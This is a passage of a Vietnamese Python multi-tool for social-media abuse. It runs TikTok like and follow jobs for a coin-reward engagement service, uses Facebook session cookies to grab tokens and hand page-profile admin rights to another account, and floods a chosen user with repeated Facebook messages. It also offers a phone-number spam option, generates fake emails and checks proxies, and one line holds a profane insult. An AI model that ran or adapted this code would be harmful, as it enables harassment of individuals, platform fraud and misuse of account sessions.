              listlike = listlike.json()['data']
            except:
              print(do+'Hết Nhiệm Vụ Like                             ', end = '\r');sleep(2); print('                                                        ', end = '\r')
              continue
            if len(listlike) == 0:
              print(do+'Hết Nhiệm Vụ Like                             ', end = '\r');sleep(2); print('                                                        ', end = '\r')
            else:
              print(f'\n{xanh_la}Tìm Thấy {vang}{len(listlike)} {xanh_la}Nhiệm Vụ Like                       ', end = '\r');sleep(2); print('                                                        ', end = '\r')
              for i in listlike:
                id = i['id']
                link = i['link']
                chuyen(link, may)
                cache = tds.cache(id, 'TIKTOK_LIKE_CACHE')
                if cache != True:
                  tg=datetime.datetime.now().strftime('%H:%M:%S')
                  hien = f'{trang}[{do}</>{vang}] {trang}| {xanh_la}{tg} {trang}| {vang}TIM {trang}| {tim}{id}'; print(hien, end = '\r');sleep(1); print('                                                                                        ', end = '\r')
                else:
                  dem+=1
                  tg=datetime.datetime.now().strftime('%H:%M:%S')
                  print(f'{trang}[{vang}{dem}{trang}] {do}| {xanh_la}{tg} {do}| {vang}TIM {do}| {tim}{id} {do}|')
                  idelay(dl)
                  if dem % nv_nhan == 0:
                    nhan = tds.nhan_xu('TIKTOK_LIKE_API', 'TIKTOK_LIKE')
                    if nhan == 0:
                      print(do+'Nhận Xu Thất Bại Acc Tiktok Của Bạn Ổn Chứ ') 
                      print(f'{trang}[{do}</>{trang}]{xanh_la}Nhập {trang}[{vang}1{trang}] {xanh_la}Để Thay Nhiệm Vụ ')
                      print(f'{trang}[{do}</>{trang}]{xanh_la}Nhập {trang}[{vang}2{trang}] {xanh_la}Thay Acc Tiktok ')
                      print(f'{trang}[{do}</>{trang}]{xanh_la}Nhấn {trang}[{vang}Enter{trang}] {xanh_la}Để Tiếp Tục')
                      chon=input(f'{trang}[{do}</>{trang}]{xanhnhat}Nhập {trang}===>: {vang}')
                      if chon == '1':
                        ntool=2
                        break
                      elif chon =='2':
                        ntool = 1
                        break
                      thanhngang(16)
        if ntool==1 or ntool==2:break
        if '2' in nhiem_vu:
          listfollow = tds.get_job('tiktok_follow')
          if listfollow == False:
            print(do+'\nKhông Get Được Nhiệm Vụ Follow              ', end = '\r');sleep(2); print('                                                        ', end = '\r')
          elif 'error' in listfollow.text:
            if listfollow.json()['error'] == 'Thao tác quá nhanh vui lòng chậm lại':
              coun = listfollow.json()['countdown']
              print(do+f'\nĐang Get Nhiệm Vụ Follow, COUNTDOWN: {str(round(coun, 3))} ', end = '\r'); sleep(2); print('                                                       ', end = '\r')
            elif listfollow.json()['error'] == 'Vui lòng ấn NHẬN TẤT CẢ rồi sau đó tiếp tục làm nhiệm vụ để tránh lỗi!':
              nhan = tds.nhan_xu('TIKTOK_FOLLOW_API', 'TIKTOK_FOLLOW') #TIKTOK_LIKE, TIKTOK_FOLLOW, TIKTOK_COMMENT
            else:
              print(do+listfollow.json()['error'] , end ='\r');sleep(2); print('                                                        ', end = '\r')
          else:
            try:
              listfollow = listfollow.json()['data']
            except:
              print(do+'Hết Nhiệm Vụ Follow                             ', end = '\r');sleep(2); print('                                                        ', end = '\r')
              continue
            if len(listfollow) == 0:
              print(do+'Hết Nhiệm Vụ Follow                             ', end = '\r');sleep(2); print('                                                        ', end = '\r')
            else:
              print(xanh_la+f'\nTìm Thấy {vang}{len(listfollow)} {xanh_la}Nhiệm Vụ Follow                       ', end = '\r');sleep(2); print('                                                        ', end = '\r')
              for i in listfollow:
                id = i['id']
                link = i['link']
                chuyen(link, may)
                cache = tds.cache(id, 'TIKTOK_FOLLOW_CACHE')
                if cache != True:
                  tg=datetime.datetime.now().strftime('%H:%M:%S')
                  hien = f'{trang}[{do}</>{trang}] {do}| {xanh_la}{tg} {do}| {vang}FOLLOW {do}| {tim}{id}' 
                  print(hien, end = '\r');sleep(1); print('                                                                                        ', end = '\r')
                else:
                  dem+=1
                  tg=datetime.datetime.now().strftime('%H:%M:%S')
                  print(f'\n{trang}[{vang}{dem}{trang}] {do}| {xanh_la}{tg} {do}|  {vang}FOLLOW {do}| {tim}{id}')
                  idelay(dl)
                  if dem % nv_nhan == 0:
                    nhan = tds.nhan_xu('TIKTOK_FOLLOW_API', 'TIKTOK_FOLLOW')
                    if nhan == 0:
                      print(do+'Nhận Xu Thất Bại Acc Tiktok Của Bạn Ổn Chứ ') 
                      print(f'{trang}[{do}</>{trang}]{xanh_la}Nhập {trang}[{vang}1{trang}] {xanh_la}Để Thay Nhiệm Vụ ')
                      print(f'{trang}[{do}</>{trang}]{xanh_la}Nhập {trang}[{vang}2{trang}] {xanh_la}Thay Acc Tiktok ')
                      print(f'{trang}[{do}</>{trang}]{xanh_la}Nhấn {trang}[{vang}Enter{trang}] {xanh_la}Để Tiếp Tục')
                      chon=input(f'{trang}[{do}</>{trang}]{xanhnhat}Nhập {trang}===>: {vang}')
                      if chon == '1':
                        ntool=2
                        break
                      elif chon =='2':
                        ntool = 1
                        break
                      thanhngang(16)
        if ntool==1 or ntool==2:break
        if '3' in nhiem_vu:
          listfollow = tds.get_job('tiktok_follow')
          if listfollow == False:
            print(do+'Không Get Được Nhiệm Vụ Follow              ', end = '\r');sleep(2); print('                                                        ', end = '\r')
          elif 'error' in listfollow.text:
            if listfollow.json()['error'] == 'Thao tác quá nhanh vui lòng chậm lại':
              coun = listfollow.json()['countdown']
              print(f'{do}Đang Get Nhiệm Vụ Follow, COUNTDOWN: {str(round(coun, 3))} ', end = '\r'); sleep(2); print('                                                       ', end = '\r')
            elif listfollow.json()['error'] == 'Vui lòng ấn NHẬN TẤT CẢ rồi sau đó tiếp tục làm nhiệm vụ để tránh lỗi!':
              nhan = tds.nhan_xu('TIKTOK_FOLLOW_API', 'TIKTOK_FOLLOW') #TIKTOK_LIKE, TIKTOK_FOLLOW, TIKTOK_COMMENT
            else:
              print(do+listfollow.json()['error'] , end ='\r');sleep(2); print('                                                        ', end = '\r')
          else:
            try:
              listfollow = listfollow.json()['data']
            except:
              print(do+'Hết Nhiệm Vụ Follow                             ', end = '\r');sleep(2); print('                                                        ', end = '\r')
              continue
            if len(listfollow) == 0:
              print(do+'Hết Nhiệm Vụ Follow                             ', end = '\r');sleep(2); print('                                                        ', end = '\r')
            else:
              print(f'{xanh_la}\nTìm Thấy {vang}{len(listfollow)} {xanh_la}Nhiệm Vụ Follow                       ', end = '\r');sleep(2); print('                                                        ', end = '\r')
              for i in listfollow:
                id = i['id']
                uid = id.split('_')[0] 
                link = i['link']
                que = i['uniqueID']
                if may == 'mb':
                  chuyen(f'tiktoknow://user/profile?user_id={uid}', may)
                else:
                  chuyen(f'https://now.tiktok.com/@{que}', may)
                cache = tds.cache(id, 'TIKTOK_FOLLOW_CACHE')
                if cache != True:
                  tg=datetime.datetime.now().strftime('%H:%M:%S')
                  hien = f'{trang}[{do}</>{trang}] {do}| {xanh_la}{tg} {do}| {vang}FOLLOW_TIKTOK_NOW {do}| {tim}{id}'; print(hien, end = '\r');sleep(1); print('                                                                                        ', end = '\r')
                else:
                  dem+=1
                  tg=datetime.datetime.now().strftime('%H:%M:%S')
                  print(f'{trang}[{vang}{dem}{trang}] {do}| {xanh_la}{tg} {do}| {vang}FOLLOW_TIKTOK_NOW {do}| {tim}{id}')
                  idelay(dl)
                  if dem % nv_nhan == 0:
                    nhan = tds.nhan_xu('TIKTOK_FOLLOW_API', 'TIKTOK_FOLLOW')
                    if nhan == 0:
                      print(do+'Nhận Xu Thất Bại Acc Tiktok Của Bạn Ổn Chứ ') 
                      print(f'{trang}[{do}</>{trang}]{xanh_la}Nhập {trang}[{vang}1{trang}] {xanh_la}Để Thay Nhiệm Vụ ')
                      print(f'{trang}[{do}</>{trang}]{xanh_la}Nhập {trang}[{vang}2{trang}] {xanh_la}Thay Acc Tiktok ')
                      print(f'{trang}[{do}</>{trang}]{xanh_la}Nhấn {trang}[{vang}Enter{trang}] {xanh_la}Để Tiếp Tục')
                      chon=input(f'{trang}[{do}</>{trang}]{xanhnhat}Nhập {trang}===>: {vang}')
                      if chon == '1':
                        ntool=2
                        break
                      elif chon =='2':
                        ntool = 1
                        break
                      thanhngang(16)
#===============================================================================================
#===============================================================================================

#===============================================================================================
#===============================================================================================
class chuyen_quyen_admin:
  def __init__(self,cookie):
    self.cookie = cookie
    self.headers = {
      'authority': 'mbasic.facebook.com',
      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
      'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
      'cache-control': 'max-age=0',
      'cookie': cookie,
      'origin': 'https://www.facebook.com',
      'referer': 'https://www.facebook.com',
      'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'document',
      'sec-fetch-mode': 'navigate',
      'sec-fetch-site': 'none',
      'sec-fetch-user': '?1',
      'upgrade-insecure-requests': '1',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
      }
      #continue 
  def get_thongtin(self):
    try:
      home = requests.get('https://mbasic.facebook.com/profile.php',headers=self.headers).text
      self.fb_dtsg = home.split('<input type="hidden" name="fb_dtsg" value="')[1].split('"')[0]
      self.jazoest = home.split('<input type="hidden" name="jazoest" value="')[1].split('"')[0]
      ten = home.split('<title>')[1].split('</title>')[0]
      self.user_id = self.cookie.split('c_user=')[1].split(';')[0]
      print(f'\n{xanh_la}Tên Facebook: {vang}{ten} {do}| {xanh_la}ID: {vang}{self.user_id} ', end='')
      sys.stdout.flush()
      return self.user_id
    except:
      print(do+'\nKhông Get Được Thông Tin ! ')
      return 0
  def get_pro5(self):
    headers={
                  'authority': 'www.facebook.com',
                  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                  'accept-language': 'vi',
                  'cookie': self.cookie,
                  'sec-ch-prefers-color-scheme': 'light',
                  'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
                  'sec-ch-ua-mobile': '?0',
                  'sec-ch-ua-platform': '"Windows"',
                  'sec-fetch-dest': 'document',
                  'sec-fetch-mode': 'navigate',
                  'sec-fetch-site': 'none',
                  'sec-fetch-user': '?1',
                  'upgrade-insecure-requests': '1',
                  'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
                  'viewport-width': '1366',
                }
    data ={
          'av':self.user_id,
          'fb_dtsg':self.fb_dtsg,
          'jazoest':self.jazoest,
          'fb_api_caller_class':'RelayModern',
          'fb_api_req_friendly_name':'CometSettingsDropdownListQuery',
          'variables':'{"fetchTestUserProfileListCell":false,"includeHorizBadging":false,"inProfileSwitcherEntry":false,"inSimpleHeaderEntry":true,"scale":2}',
          'server_timestamps':'true',
          'doc_id':'8179507702122101',
        }
    try:
      a=requests.post('https://www.facebook.com/api/graphql/', headers=headers,data=data).json()
      get = a['data']['viewer']['actor']['profile_switcher_eligible_profiles']
      tong = get['count']
      data_pro5 = get['nodes']
      print(f'{do}| {vang}{tong} {xanh_la}Page Profile')
      return data_pro5
    except:
      print(do+'\nKhông Get Được Page Profile ')
      return 0
  def chap_nhan(self, id_moi, id_page, name):
    headers = {
      "Host": "www.facebook.com",
      "content-length": "1368",
      "sec-ch-ua": "\"Chromium\";v\u003d\"107\", \"Not\u003dA?Brand\";v\u003d\"24\"",
      "sec-ch-ua-mobile": "?0",
      "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
      "viewport-width": "980",
      "content-type": "application/x-www-form-urlencoded",
      "x-fb-lsd": "DlCuUH2d6LEfs4R3HXWyCL",
      "x-fb-friendly-name": "ProfilePlusCometAcceptOrDeclineAdminInviteMutation",
      "sec-ch-prefers-color-scheme": "dark",
      "sec-ch-ua-platform": "\"Linux\"",
      "accept": "*/*",
      "origin": "https://www.facebook.com",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://www.facebook.com/profile.php?id\u003d100087892570045\u0026notif_id\u003d1670335596145290\u0026notif_t\u003dprofile_plus_admin_invite\u0026ref\u003dnotif",
      "accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5",
      "cookie": self.cookie
    }
    data={
    'av': self.user_id, 
    '__user': self.user_id,
    '__a':'1',
    '__dyn':'7AzHJ16UW5Eb8ng5K8G6EjBWobVo66u2i5U4e0ykdwSxucyUco5S3O2Saxa1NwJwpUe8hwaG0Z82_CxS320om78bbwto886C11xmfz81sbzoaEnxO0Bo7O2l2Utwwwi831wiEjwZwlo5qfK6E7e58jwGzE8FU5e7oqBwJK2W5olwUwgojUlDw-wUwxwjFovUy2a0SEuBwJCwLyESE2KwwwOg2cwMwhF8-4UdUcobUak1xwJwxw',
    '__csr':'gjYmwDPV5kCL4_fcx5FjFbcwBRb4jIHiO_8zEAzFuCWSGtiSSCmyeLiSqqF6RiWAFKh5l4XQ9J29oFGVrKcKEnApUC9qCWUS-8ADhEO6ojxah3miez8XyEVa6p9FWDUPzECbCxC7rCwMwyy48CzobVofkueCwNBAx-8g6CEpguxC322e2qUbFEvypoW5Edozxm3O0y88EkxK9yE25Gmdwo88EaUrwJzU9U2mx66oSfxe6oJw0QRw0-ew0aou0vd04zw4Xw1h-0yE1XQ02ruu07jE0SwE06320l-1fg0wK0c_wpE2Gw7Kw',
    '__req':'n',
    '__hs':'19332.HYP:comet_pkg.2.1.0.2.1',
    'dpr':'2',
    '__ccg':'GOOD',
    '__rev':'1006690336',
    '__s':'pg8xvj:d1f9pk:2fmmqb',
    '__hsi':'7174038987510665339',
    '__comet_req':'15',
    'fb_dtsg':self.fb_dtsg,
    'jazoest':self.jazoest,
    'lsd':'DlCuUH2d6LEfs4R3HXWyCL',
    '__aaid':'775223720487728',
    '__spin_r':'1006690336',
    '__spin_b':'trunk',
    '__spin_t':'1670336115',
    'fb_api_caller_class':'RelayModern',
    'fb_api_req_friendly_name':'ProfilePlusCometAcceptOrDeclineAdminInviteMutation',
    'variables':'{"input":{"client_mutation_id":"1","actor_id":"'+self.user_id+'","is_accept":true,"profile_admin_invite_id":"'+str(id_moi)+'","user_id":"'+id_page+'"},"scale":2}',
    'server_timestamps':'true',
    'doc_id':'6535667269801310',
  }
    try:
      chapnhan = requests.post('https://www.facebook.com/api/graphql/', headers = headers, data =data).json()
      #print(chapnhan)
      check=chapnhan['data']['accept_or_decline_profile_plus_admin_invite']['comet_profile_banner']['notice']['title']['text']
      
      print(f'{tim} ╰─> {xanh_la}Chấp Nhận Quyền Quản Trị Thành Công')
    except:
      print(do+'Chấp Nhận Quyền Quản Trị Thất Bại ')
  def set_admin(self, id, mk, id_page, name):
    cookie = self.cookie
    ck_pro5 = cookie + '; i_user=' + id_page + ';'
    headers_1 = {
            'authority': 'www.facebook.com',
            'accept': '*/*',
            'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6',
            'origin': 'https://www.facebook.com',
            'referer': 'https://www.facebook.com/settings/?tab=profile_access',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
            'viewport-width': '1074',
            'x-fb-friendly-name': 'ProfilePlusMarkReauthedMutation',
            'x-fb-lsd': 'ywHjyvroP8nBIwLKTYWKxO',
            'cookie': ck_pro5,
        }
    data_1 = {
            'av': id_page, 
            '__user': id_page,
            '__a': '1',
            '__dyn': '7AzHxqU5a5Q1ryUqxenFw9uu2i5U4e0ykdwSwAyUco2qwJxS1NwJwpUe8hw6vwb-q7oc81xoswaq221FwgolzUO0n2US2G5Usw9m1YwBgK7o884y0Mo5W3S1lwlE-UqwsUkxe2GewGwsoqBwJK2W5olwUwlu5o4q0GpovUaU3VBwJCwLyES0Io5d08O321bwzwTwNwLwFg667EW26',
            '__csr': 'nf1ld2JWTf4SHVBJ7m8V9fl7LV8WUGbjAHnAmFpKmGiCKrUB7yF8y4Hh4bBK8BDWUohbLBzkdxivUG2aQaBzEgF28hyp8zxi5E9EGcGp162a3eA2udwMzXzokyo7e2a1Rx62-3C4ocEhU6e5oC8yUK8Bws9E5S4Gwb21dwp8sw6gwvUbU2ew920LU1zo5m1fw0Fjw1n-2K00PtE0kIw1pha7A27g0udg04CR00wixW0oy15w7Sg0lPzEkG1zw1b102bE',
            '__req': 'm',
            '__hs': '19328.HYP:comet_plat_default_pkg.2.1.0.2.1',
            'dpr': '1',
            '__ccg': 'GOOD',
            '__rev': '1006673379',
            '__s': 'obqdxp:ldjxfi:qlyl0z',
            '__hsi': '7172443321293327429',
            '__comet_req': '1',
            'fb_dtsg': self.fb_dtsg,
            'jazoest': self.jazoest,
            'lsd': 'ywHjyvroP8nBIwLKTYWKxO',
            '__spin_r': '1006673379',
            '__spin_b': 'trunk',
            '__spin_t': '1669964595',
            'fb_api_caller_class': 'RelayModern',
            'fb_api_req_friendly_name': 'ProfilePlusMarkReauthedMutation',
            'variables': '{"input":{"password":{"sensitive_string_value":"'+str(mk)+'"},"actor_id":"'+str(id_page)+'","client_mutation_id":"1"}}',
            'server_timestamps': 'true',
            'doc_id': '5048033918567225',
        }
    try:
      nhap_mk = requests.post('https://www.facebook.com/api/graphql/', headers = headers_1, data =data_1).json()
      #print(nhap_mk.text)
      check = nhap_mk['data']['admin_management_mark_reauthed']['reauth_is_successful']
      if str(check) == 'True' or str(check) == 'true':
        pass
      else:
        print(do+'Mật Khẩu Sai !!')
        return 0
    except:
      print(do+'Xác Minh Mật Khẩu Thất Bại, Có Thể Bị Block Hãy Thử Lại Sau !!')
      return 0
    headers={
      'Host':'www.facebook.com',
      'sec-ch-ua':'"Chromium";v="107", "Not=A?Brand";v="24"',
      'sec-ch-ua-mobile':'?0',
      'user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36',
      'viewport-width':'980',
      'content-type':'application/x-www-form-urlencoded',
      'x-fb-lsd':'bTS-BmlWblhR0XQU4HNRbo',
      'x-fb-friendly-name':'ProfilePlusCoreAppAdminInviteMutation',
      'sec-ch-ua-platform':'"Linux"',
      'sec-ch-prefers-color-scheme':'dark',
      'accept':'*/*',
      'origin':'https://www.facebook.com',
      'sec-fetch-site':'same-origin',
      'sec-fetch-mode':'cors',
      'sec-fetch-dest':'empty',
      'referer':'https://www.facebook.com/settings/?tab=profile_access',
      'accept-language':'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
      'cookie':ck_pro5
    }
    data ={
      'av':id_page,
      'fb_dtsg': self.fb_dtsg,
      'jazoest': self.jazoest,
      'fb_api_caller_class':'RelayModern',
      'fb_api_req_friendly_name':'ProfilePlusCoreAppAdminInviteMutation',
      'variables':'{"input":{"additional_profile_id":"'+id_page+'","admin_id":"'+id+'","admin_visibility":"Unspecified","grant_full_control":true,"actor_id":"'+id_page+'","client_mutation_id":"2"}}',
      'server_timestamps':'true',
      'doc_id':'5632879080105060',
      'fb_api_analytics_tags':'["qpl_active_flow_ids=30605361"]'
  }
    try:
      set=requests.post('https://www.facebook.com/api/graphql/', headers=headers, data=data)
      #print(set.json())
      if id in set.text:
        data_id_moi = set.json()['data']['profile_plus_core_admin_invite']['profile_with_biz_tools']['outgoing_core_app_admin_invites']
        for x in data_id_moi:
          id_admin = x['admin_profile']['id']
          name_admin = x['admin_profile']['name']
          if id_admin == id:
            id_moi= x['profile_admin_invite_id']
            break
        
        
        print(f'{trang}[{vang}{dem+1}{trang}] {trang}[{xanh_duong}{name} {do}| {tim}{id_page}{trang}] {trang}[{xanhnhat}{name_admin} {do}| {tim}{id}{trang}] {xanh_la} SUCCESS')
        
        return id_moi
      else:
        print(f'{trang}[{vang}{dem+1}{trang}] {trang}[{xanh_duong}{name} {do}| {tim}{id_page}{trang}] {trang}[{xanhnhat}Admin {do}: {tim}{id}{trang}] {do} ERROR')
        
    except:
      print(f'{trang}[{vang}{dem+1}{trang}] {trang}[{xanh_duong}{name} {do}| {tim}{id_page}{trang}] {trang}[{xanhnhat}Admin {do}: {tim}{id}{trang}] {do} ERROR')
      
    return 'None'
  
#============================================================================================
#===========================================================================================

def fakeEmail():
  faker = Faker()
  data_kytu = ['', '_', '.']
  so_luong = int(input(f"\033[1;31m[\033[1;37m</>\033[1;31m] {xanhnhat}Nhập Số Lượng Mail Muốn Đào :{vang} "))
  Domain = input(f"\033[1;31m[\033[1;37m</>\033[1;31m] {xanhnhat}Nhập Domain(ex: yahoo.com) :{vang} ")
  file_email = input(f"\033[1;31m[\033[1;37m</>\033[1;31m] {xanhnhat}Nhập File Lưu Mail(ex: email.txt) :{vang} ")
  n = 0
  for fake in range(so_luong):
    n += 1
    num = randint(10,200)
    first_name = faker.first_name().lower()
    last_name = faker.last_name().lower()
    get_kytu = random.choice(data_kytu)
    fake_email = first_name + last_name + str(num) + '@' + Domain
    print (" [" + str(n) + "] " + fake_email)
    open(file_email,"a").write(fake_email + "\n")
#===========================================================================================
def main():
  nhap = input("\033[96m\033[1mVui lòng nhập tool (nhập số tương ứng): ")
  if nhap == '0':
    clear()
    runbanner(tct)
    
  elif nhap == '1':
    clear()
    runbanner(mot)
    
  elif nhap == '1.1':
    clear()
    runbanner(banner2)
    sdt = input("\033[96m\033[1mNhập số điện thoại muốn spam :\033[93m\033[1m ")
    while not re.search("^(0?)(3[2-9]|5[6|8|9]|7[0|6-9]|8[0-6|7|8|9]|9[0-4|6-9])[0-9]{7}$",sdt):
        print("\033[91mNhập sai định dạng số")
        sdt = input("\033[96m\033[1mNhập số điện thoại muốn spam :\033[93m\033[1m ")
    #count = int(input("\033[96m\033[1mNhập số lần muốn spam :\033[93m\033[1m "))
    print(f"Đang spam số {sdt}")
    i = 0
    while True:
      run(sdt, i)
    if sdt == "0359489321":
        print("\033[91mSài tool tao thì spam cc số tao nha con chó\033[0m")
        quit()
        
  elif nhap == '1.2':
     clear()
     runbanner(chontool)
     dao_proxy()
     
  elif nhap == '1.3':
     clear()
     runbanner(chontool)
     with open('live.txt','w') as file1:
          file1.write('Tool Check Proxy_Live by vLong Dec\n')
     def check_proxy(proxy):
          proxy = proxy.strip()
          url = f'https://clonebysun.com/api/tienich/checkliveproxy/{proxy.strip()}'
          data = requests.get(url)
          if 'ip' in data.json() and 'proxy' in data.json() and 'status' in data.json():
               country = data.json()["country"]
               if data.json()['ip'] != 'error' and data.json()['proxy'] != '' and data.json()['status'] != 'Die':
                    print(f'{xanh_la}Live => {data.json()["ip"]} {xanh_duong}Country {vang}{data.json()["country"]} ')
                    with open('live.txt', 'a+') as f:
                         f.write(proxy + " | "+country+"\n")
               else:
                     print(f'{do}Die => {trang}{proxy}')
          else:
               print(f'{do}Invalid JSON response: {data.text}')
    
     file_path = input(f'{xanh_duong}Nhập đường dẫn file cần kiểm tra: {vang}')
     if not os.path.exists(file_path):
          print(f'{do}Lỗi: File không tồn tại')
          exit()
     with open(file_path, 'r') as file:
          lines = file.readlines()
     luong=int(input(f"{xanh_duong}Nhập Số Luồng:{vang} "))
     with ThreadPoolExecutor(max_workers=luong) as executor:
          executor.map(check_proxy, lines)
          print(f'{vang}Hoàn tất, kết quả đã được lưu vào file: {xanh_la}live.txt')
  
  elif nhap == '1.4':
    clear()
    runbanner(chontool)
    rum = reg_pro5()
    stt = 0
    ck_fb= input(f" \033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập Cookie Acc Cần Get Token : {vang}")
    checklive = rum.getthongtinfacebook(ck_fb)
    if checklive != False:
        token_fb = get_token(ck_fb) 
        print(f'{tim}Name Facebook: {xanh_la}'+checklive[0])
        print(f"{xanh_la}TOKEN profile-pro5 của bạn là {trang}:{vang}{token_fb} ")
    else:
        stt-1
        print(f'{do}cookie die')

  elif nhap == '1.5':
    clear()
    runbanner(chontool)
    gpt()
  
  elif nhap == '2':
    clear()
    runbanner(hai)
    
  elif nhap == '2.1':
    clear()
    runbanner(chontool)
    idcanspam=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập id người cần spam :{vang} ')
    while True:
      ck=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập cookie facebook :{vang} ')
      try:
        get=requests.get(f'https://mbasic.facebook.com/privacy/touch/block/confirm/?bid={idcanspam}&ret_cancel&source=profile',headers={'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5','cookie': ck,'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="102", "Google Chrome";v="102"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1'}).text
        fb_dtsg=get.split('<input type="hidden" name="fb_dtsg" value="')[1].split('" autocomplete="off" />')[0]
        jazoest=get.split('<input type="hidden" name="jazoest" value="')[1].split('" autocomplete="off" />')[0]
        clear()
        break
      except:
        print(f'{do}Cookie sai!!')
    

    runbanner(chontool)
    nd=input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập nội dung :{vang} ')
    yn=str(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}bạn muốn spam mãi mãi không :> {trang}({vang}y{trang}/{vang}n{trang}) :{vang} '))
    headers = {
      'authority': 'm.facebook.com',
      'accept': '*/*',
      'accept-language': 'vi,en;q=0.9,vi-VN;q=0.8,fr-FR;q=0.7,fr;q=0.6,en-US;q=0.5',
      # Requests sorts cookies= alphabetically
      'cookie': ck,
      'origin': 'https://m.facebook.com',
      'referer': 'https://www.facebook.com',
      'sec-ch-ua': '"Chromium";v="104", " Not A;Brand";v="99", "Google Chrome";v="104"',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '"Windows"',
      'sec-fetch-dest': 'empty',
     'sec-fetch-mode': 'cors',
     'sec-fetch-site': 'same-origin',
     'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36',
     'x-requested-with': 'XMLHttpRequest',
     'x-response-format': 'JSONStream',
    }

    params = {
      'icm': '1',
    } 

    data = {
      f'ids[{idcanspam}]': idcanspam,
      'body': nd,
     'waterfall_source': 'message',
     'fb_dtsg': fb_dtsg,
     'jazoest': jazoest,
    }
    if yn.lower() == 'y':
      delay=int(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập delay(khuyến cáo trên 10s) :{vang} '))
      while True:
          response = requests.post('https://m.facebook.com/messages/send/', params=params, headers=headers, data=data)
          print(f'{xanh_la}Send Success | {nd}')
          idelay(delay)

    elif yn.lower() == 'n':
      soluong = int(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập số tin nhắn muốn gửi :{vang} '))
      delay=int(input(f'\033[1;97m[\033[1;31m</>\033[1;97m] {xanhnhat}Nhập delay(khuyến cáo trên 10s) :{vang} '))
      for i in range(1,soluong+1):
        response = requests.post('https://m.facebook.com/messages/send/', params=params, headers=headers, data=data)
        print(f'{xanh_la}Lần {i} Send Success | {tim}{nd}')
        idelay(delay) 
    else:
      print(f"{do}Vui lòng điền đúng")  

      
  elif nhap == '2.2':
    clear()
    runbanner(chontool)
    uid=input(f'\033[1m\033[38;5;51mVui lòng nhập link bài viết:{vang} ')
    ck_fb = input(f"{xanhnhat}Nhập cookie :{vang} ")
    soluong = int(input('\033[1m\033[38;5;51mNhập Số luồng: \033[38;5;15m '))
    token_fb = get_token(ck_fb)
    header={
        'cookie': ck_fb,
    }
    def Start(l):
        getTokenPage = requests.get(f"https://graph.facebook.com/v12.0/me/accounts?fields=access_token&limit=999999999&access_token={token_fb}",headers=header).json()['data']
        for tach in getTokenPage:
            uid_page=tach['id']
            access_token_page=tach['access_token']
            # print(uid_page)
            # print(access_token_page)
            buff = requests.post(f"https://graph.facebook.com/me/feed?link=https://www.facebook.com/{uid}&published=0&access_token={access_token_page}",headers=header).text
            if "error" in buff:
                print(f'{xanhnhat}{uid_page}\033[0m {do}Faild')
            else:
                print(f'{xanhnhat}{buff}\033[0m \033[1m{xanh_la}Success')


    threades = []
    for l in range(soluong):
        threades += [threading.Thread(target=Start,args={l},)]
    for t in threades:
        t.start()
    for t in threades:
        t.join()
    print(f'{xanh_la}Đã Xong!')
    
  elif nhap == '2.3':
    clear()
    runbanner(chontool)
    ck=input(f"{xanhnhat}Nhập Cookie Facebook Cần Nuôi:{vang} ")
    clear()
    runbanner(chontool)
    idck=re.findall("c_user=.*?;",ck)[0]
